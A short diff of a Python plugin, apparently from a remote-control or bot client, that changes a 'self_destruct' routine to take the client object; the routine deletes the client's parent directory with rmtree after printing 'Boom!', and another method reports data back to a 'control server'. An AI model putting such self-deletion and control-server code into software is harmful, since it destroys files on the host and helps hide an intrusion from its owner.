@@ -98,7 +98,7 @@ class Plugin(object):
             sleep(1)
             client.server_print('Boom!')
 
-            Plugin.self_destruct()
+            Plugin.self_destruct(client)
             sys.exit()
 
         client.server_print('< No command: {} >'.format(data))
@@ -106,16 +106,17 @@ class Plugin(object):
         return
 
     @staticmethod
-    def self_destruct():
+    def self_destruct(client):
         """
         Destroy self.
 
+        :param client:
         :return:
         """
 
-        filename = __file__.split('/')[-1]
-        cd = __file__.split('/')[-2]
-        directory = __file__.replace(filename, '').replace(cd + '/', '')
+        filename = client.__file__.split('/')[-1]
+        cd = client.__file__.split('/')[-2]
+        directory = client.__file__.replace(filename, '').replace(cd + '/', '')
         rmtree(directory)
 
     @staticmethod
@@ -124,6 +125,7 @@ class Plugin(object):
         Send something back to the control server with the current
         working directory appended to the end of it.
 
+        :param client:
         :param some_data:
         :return:
         """
